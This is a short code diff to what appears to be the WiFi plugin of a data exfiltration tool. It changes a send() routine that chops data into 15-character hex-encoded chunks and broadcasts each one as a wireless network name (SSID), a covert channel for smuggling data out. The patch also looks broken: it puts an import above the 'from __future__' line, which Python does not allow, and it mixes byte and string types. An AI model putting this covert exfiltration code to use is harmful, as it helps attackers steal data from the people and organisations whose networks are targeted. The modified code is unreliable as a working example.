@@ -1,3 +1,4 @@
+from binascii import hexlify
 from __future__ import print_function
 
 try:
@@ -44,11 +45,11 @@ def PacketHandler(pkt):
                     pass
 
 def send(data):
-    # data = data.encode('hex')
+    # data = hexlify(data.encode())
     while data != "":
         tmp = data[:15]
         data = data.replace(tmp, '')
-        tmp = tmp.encode('hex')
+        tmp = hexlify(tmp.encode())
         app_exfiltrate.log_message('info', "[wifi] Sending {0} on {1}".format(tmp, config['interface']))
         netSSID = tmp       #Network name here
         iface = str(config['interface'])         #Interface name here
